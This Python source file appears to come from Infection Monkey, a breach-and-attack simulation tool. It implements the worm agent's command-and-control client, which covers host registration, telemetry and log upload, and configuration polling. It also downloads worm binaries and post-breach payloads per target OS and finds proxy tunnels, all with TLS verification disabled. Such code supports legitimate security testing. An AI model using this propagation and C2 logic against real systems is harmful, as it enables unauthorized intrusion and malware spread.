import json
import logging
import platform
from datetime import datetime
from pprint import pformat
from socket import gethostname
from urllib.parse import urljoin

import requests
from requests.exceptions import ConnectionError

import infection_monkey.monkeyfs as monkeyfs
import infection_monkey.tunnel as tunnel
from common.common_consts.api_url_consts import T1216_PBA_FILE_DOWNLOAD_PATH
from common.common_consts.time_formats import DEFAULT_TIME_FORMAT
from common.common_consts.timeouts import (
    LONG_REQUEST_TIMEOUT,
    MEDIUM_REQUEST_TIMEOUT,
    SHORT_REQUEST_TIMEOUT,
)
from infection_monkey.config import GUID, WormConfiguration
from infection_monkey.network.info import local_ips
from infection_monkey.transport.http import HTTPConnectProxy
from infection_monkey.transport.tcp import TcpProxy
from infection_monkey.utils.environment import is_windows_os

requests.packages.urllib3.disable_warnings()

logger = logging.getLogger(__name__)
DOWNLOAD_CHUNK = 1024

PBA_FILE_DOWNLOAD = "https://%s/api/pba/download/%s"

# random number greater than 5,
# to prevent the monkey from just waiting forever to try and connect to an island before going
# elsewhere.
TIMEOUT_IN_SECONDS = 15


class ControlClient(object):
    proxies = {}

    @staticmethod
    def wakeup(parent=None):
        if parent:
            logger.debug("parent: %s" % (parent,))

        hostname = gethostname()
        if not parent:
            parent = GUID

        monkey = {
            "guid": GUID,
            "hostname": hostname,
            "ip_addresses": local_ips(),
            "description": " ".join(platform.uname()),
            "config": WormConfiguration.as_dict(),
            "parent": parent,
            "launch_time": str(datetime.now().strftime(DEFAULT_TIME_FORMAT)),
        }

        if ControlClient.proxies:
            monkey["tunnel"] = ControlClient.proxies.get("https")

        requests.post(  # noqa: DUO123
            "https://%s/api/monkey" % (WormConfiguration.current_server,),
            data=json.dumps(monkey),
            headers={"content-type": "application/json"},
            verify=False,
            proxies=ControlClient.proxies,
            timeout=20,
        )

    @staticmethod
    def find_server(default_tunnel=None):
        logger.debug(
            "Trying to wake up with Monkey Island servers list: %r"
            % WormConfiguration.command_servers
        )
        if default_tunnel:
            logger.debug("default_tunnel: %s" % (default_tunnel,))

        current_server = ""

        for server in WormConfiguration.command_servers:
            try:
                current_server = server

                debug_message = "Trying to connect to server: %s" % server
                if ControlClient.proxies:
                    debug_message += " through proxies: %s" % ControlClient.proxies
                logger.debug(debug_message)
                requests.get(  # noqa: DUO123
                    f"https://{server}/api?action=is-up",
                    verify=False,
                    proxies=ControlClient.proxies,
                    timeout=TIMEOUT_IN_SECONDS,
                )
                WormConfiguration.current_server = current_server
                break

            except ConnectionError as exc:
                current_server = ""
                logger.warning("Error connecting to control server %s: %s", server, exc)

        if current_server:
            return True
        else:
            if ControlClient.proxies:
                return False
            else:
                logger.info("Starting tunnel lookup...")
                proxy_find = tunnel.find_tunnel(default=default_tunnel)
                if proxy_find:
                    ControlClient.set_proxies(proxy_find)
                    return ControlClient.find_server()
                else:
                    logger.info("No tunnel found")
                    return False

    @staticmethod
    def set_proxies(proxy_find):
        """
        Note: The proxy schema changes between different versions of requests and urllib3,
        which causes the machine to not open a tunnel back.
        If we get "ValueError: check_hostname requires server_hostname" or
        "Proxy URL had not schema, should start with http:// or https://" errors,
        the proxy schema needs to be changed.
        Keep this in mind when upgrading to newer python version or when urllib3 and
        requests are updated there is possibility that the proxy schema is changed.
        https://github.com/psf/requests/issues/5297
        https://github.com/psf/requests/issues/5855
        """
        proxy_address, proxy_port = proxy_find
        logger.info("Found tunnel at %s:%s" % (proxy_address, proxy_port))
        if is_windows_os():
            ControlClient.proxies["https"] = f"http://{proxy_address}:{proxy_port}"
        else:
            ControlClient.proxies["https"] = f"{proxy_address}:{proxy_port}"

    @staticmethod
    def keepalive():
        if not WormConfiguration.current_server:
            return
        try:
            monkey = {}
            if ControlClient.proxies:
                monkey["tunnel"] = ControlClient.proxies.get("https")
            requests.patch(  # noqa: DUO123
                "https://%s/api/monkey/%s" % (WormConfiguration.current_server, GUID),
                data=json.dumps(monkey),
                headers={"content-type": "application/json"},
                verify=False,
                proxies=ControlClient.proxies,
                timeout=MEDIUM_REQUEST_TIMEOUT,
            )
        except Exception as exc:
            logger.warning(
                "Error connecting to control server %s: %s", WormConfiguration.current_server, exc
            )
            return {}

    @staticmethod
    def send_telemetry(telem_category, json_data: str):
        if not WormConfiguration.current_server:
            logger.error(
                "Trying to send %s telemetry before current server is established, aborting."
                % telem_category
            )
            return
        try:
            telemetry = {"monkey_guid": GUID, "telem_category": telem_category, "data": json_data}
            requests.post(  # noqa: DUO123
                "https://%s/api/telemetry" % (WormConfiguration.current_server,),
                data=json.dumps(telemetry),
                headers={"content-type": "application/json"},
                verify=False,
                proxies=ControlClient.proxies,
                timeout=MEDIUM_REQUEST_TIMEOUT,
            )
        except Exception as exc:
            logger.warning(
                "Error connecting to control server %s: %s", WormConfiguration.current_server, exc
            )

    @staticmethod
    def send_log(log):
        if not WormConfiguration.current_server:
            return
        try:
            telemetry = {"monkey_guid": GUID, "log": json.dumps(log)}
            requests.post(  # noqa: DUO123
                "https://%s/api/log" % (WormConfiguration.current_server,),
                data=json.dumps(telemetry),
                headers={"content-type": "application/json"},
                verify=False,
                proxies=ControlClient.proxies,
                timeout=MEDIUM_REQUEST_TIMEOUT,
            )
        except Exception as exc:
            logger.warning(
                "Error connecting to control server %s: %s", WormConfiguration.current_server, exc
            )

    @staticmethod
    def load_control_config():
        if not WormConfiguration.current_server:
            return
        try:
            reply = requests.get(  # noqa: DUO123
                "https://%s/api/monkey/%s/legacy" % (WormConfiguration.current_server, GUID),
                verify=False,
                proxies=ControlClient.proxies,
                timeout=MEDIUM_REQUEST_TIMEOUT,
            )

        except Exception as exc:
            logger.warning(
                "Error connecting to control server %s: %s", WormConfiguration.current_server, exc
            )
            return

        try:
            unknown_variables = WormConfiguration.from_kv(reply.json().get("config"))
            formatted_config = pformat(
                WormConfiguration.hide_sensitive_info(WormConfiguration.as_dict())
            )
            logger.info(f"New configuration was loaded from server:\n{formatted_config}")
        except Exception as exc:
            # we don't continue with default conf here because it might be dangerous
            logger.error(
                "Error parsing JSON reply from control server %s (%s): %s",
                WormConfiguration.current_server,
                reply._content,
                exc,
            )
            raise Exception("Couldn't load from from server's configuration, aborting. %s" % exc)

        if unknown_variables:
            ControlClient.send_config_error()

    @staticmethod
    def send_config_error():
        if not WormConfiguration.current_server:
            return
        try:
            requests.patch(  # noqa: DUO123
                "https://%s/api/monkey/%s" % (WormConfiguration.current_server, GUID),
                data=json.dumps({"config_error": True}),
                headers={"content-type": "application/json"},
                verify=False,
                proxies=ControlClient.proxies,
                timeout=MEDIUM_REQUEST_TIMEOUT,
            )
        except Exception as exc:
            logger.warning(
                "Error connecting to control server %s: %s", WormConfiguration.current_server, exc
            )
            return {}

    @staticmethod
    def check_for_stop():
        ControlClient.load_control_config()
        return not WormConfiguration.alive

    @staticmethod
    def download_monkey_exe(host):
        filename, size = ControlClient.get_monkey_exe_filename_and_size_by_host(host)
        if filename is None:
            return None
        return ControlClient.download_monkey_exe_by_filename(filename, size)

    @staticmethod
    def download_monkey_exe_by_os(is_windows, is_32bit):
        filename, size = ControlClient.get_monkey_exe_filename_and_size_by_host_dict(
            ControlClient.spoof_host_os_info(is_windows, is_32bit)
        )
        if filename is None:
            return None
        return ControlClient.download_monkey_exe_by_filename(filename, size)

    @staticmethod
    def spoof_host_os_info(is_windows, is_32bit):
        if is_windows:
            os = "windows"
            if is_32bit:
                arch = "x86"
            else:
                arch = "amd64"
        else:
            os = "linux"
            if is_32bit:
                arch = "i686"
            else:
                arch = "x86_64"

        return {"os": {"type": os, "machine": arch}}

    @staticmethod
    def download_monkey_exe_by_filename(filename, size):
        if not WormConfiguration.current_server:
            return None
        try:
            dest_file = monkeyfs.virtual_path(filename)
            if (monkeyfs.isfile(dest_file)) and (size == monkeyfs.getsize(dest_file)):
                return dest_file
            else:
                download = requests.get(  # noqa: DUO123
                    "https://%s/api/monkey/download/%s"
                    % (WormConfiguration.current_server, filename),
                    verify=False,
                    proxies=ControlClient.proxies,
                    timeout=MEDIUM_REQUEST_TIMEOUT,
                )

                with monkeyfs.open(dest_file, "wb") as file_obj:
                    for chunk in download.iter_content(chunk_size=DOWNLOAD_CHUNK):
                        if chunk:
                            file_obj.write(chunk)
                    file_obj.flush()
                if size == monkeyfs.getsize(dest_file):
                    return dest_file

        except Exception as exc:
            logger.warning(
                "Error connecting to control server %s: %s", WormConfiguration.current_server, exc
            )

    @staticmethod
    def get_monkey_exe_filename_and_size_by_host(host):
        return ControlClient.get_monkey_exe_filename_and_size_by_host_dict(host.as_dict())

    @staticmethod
    def get_monkey_exe_filename_and_size_by_host_dict(host_dict):
        if not WormConfiguration.current_server:
            return None, None
        try:
            reply = requests.post(  # noqa: DUO123
                "https://%s/api/monkey/download" % (WormConfiguration.current_server,),
                data=json.dumps(host_dict),
                headers={"content-type": "application/json"},
                verify=False,
                proxies=ControlClient.proxies,
                timeout=LONG_REQUEST_TIMEOUT,
            )
            if 200 == reply.status_code:
                result_json = reply.json()
                filename = result_json.get("filename")
                if not filename:
                    return None, None
                size = result_json.get("size")
                return filename, size
            else:
                return None, None

        except Exception as exc:
            logger.warning(
                "Error connecting to control server %s: %s", WormConfiguration.current_server, exc
            )

        return None, None

    @staticmethod
    def create_control_tunnel():
        if not WormConfiguration.current_server:
            return None

        my_proxy = ControlClient.proxies.get("https", "").replace("https://", "")
        if my_proxy:
            proxy_class = TcpProxy
            try:
                target_addr, target_port = my_proxy.split(":", 1)
                target_port = int(target_port)
            except ValueError:
                return None
        else:
            proxy_class = HTTPConnectProxy
            target_addr, target_port = None, None

        return tunnel.MonkeyTunnel(proxy_class, target_addr=target_addr, target_port=target_port)

    @staticmethod
    def get_pba_file(filename):
        try:
            return requests.get(  # noqa: DUO123
                PBA_FILE_DOWNLOAD % (WormConfiguration.current_server, filename),
                verify=False,
                proxies=ControlClient.proxies,
                timeout=LONG_REQUEST_TIMEOUT,
            )
        except requests.exceptions.RequestException:
            return False

    @staticmethod
    def get_T1216_pba_file():
        try:
            return requests.get(  # noqa: DUO123
                urljoin(
                    f"https://{WormConfiguration.current_server}/",
                    T1216_PBA_FILE_DOWNLOAD_PATH,
                ),
                verify=False,
                proxies=ControlClient.proxies,
                stream=True,
                timeout=MEDIUM_REQUEST_TIMEOUT,
            )
        except requests.exceptions.RequestException:
            return False

    @staticmethod
    def should_monkey_run(vulnerable_port: str) -> bool:
        if (
            vulnerable_port
            and WormConfiguration.get_hop_distance_to_island() > 1
            and ControlClient.can_island_see_port(vulnerable_port)
            and WormConfiguration.started_on_island
        ):
            return False

        return True

    @staticmethod
    def can_island_see_port(port):
        try:
            url = (
                f"https://{WormConfiguration.current_server}/api/monkey_control"
                f"/check_remote_port/{port}"
            )
            response = requests.get(  # noqa: DUO123
                url, verify=False, timeout=SHORT_REQUEST_TIMEOUT
            )
            response = json.loads(response.content.decode())
            return response["status"] == "port_visible"
        except requests.exceptions.RequestException:
            return False

    @staticmethod
    def report_start_on_island():
        requests.post(  # noqa: DUO123
            f"https://{WormConfiguration.current_server}/api/monkey_control/started_on_island",
            data=json.dumps({"started_on_island": True}),
            verify=False,
            timeout=MEDIUM_REQUEST_TIMEOUT,
        )
